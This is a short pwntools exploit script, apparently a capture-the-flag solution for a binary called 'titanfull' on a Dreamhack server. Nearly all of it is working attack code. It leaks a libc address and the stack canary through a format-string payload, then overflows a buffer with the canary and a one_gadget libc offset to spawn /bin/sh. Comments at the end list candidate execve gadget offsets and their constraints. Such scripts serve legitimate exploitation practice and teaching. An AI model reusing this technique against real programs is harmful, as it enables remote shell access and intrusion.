from pwn import *

if args.LOCAL:
    io=process('./titanfull_patched')
    if args.GDB:
        cmd="""
        init-pwndbg
        """
        gdb.attach(io, cmd)
else:
    io=remote('host3.dreamhack.games', 22602)
elf=context.binary=ELF('./titanfull_patched')
pause()
io.sendline(b'%11$p_%17$p')
io.recvuntil(b'hello, ')
libc=int(io.recv(14),16)-0x84de5
io.recv(1)
canary=int(io.recv(18), 16)
print(hex(libc))
print(hex(canary))
io.sendline(str(7274).encode())
pl=b'A'*24+p64(canary)+p64(0)+p64(0xe3b01+libc)
io.sendline(pl)
io.interactive()


# 0xe3afe execve("/bin/sh", r15, r12)
# constraints:
#   [r15] == NULL || r15 == NULL
#   [r12] == NULL || r12 == NULL

# 0xe3b01 execve("/bin/sh", r15, rdx)
# constraints:
#   [r15] == NULL || r15 == NULL
#   [rdx] == NULL || rdx == NULL

# 0xe3b04 execve("/bin/sh", rsi, rdx)
# constraints:
#   [rsi] == NULL || rsi == NULL
#   [rdx] == NULL || rdx == NULL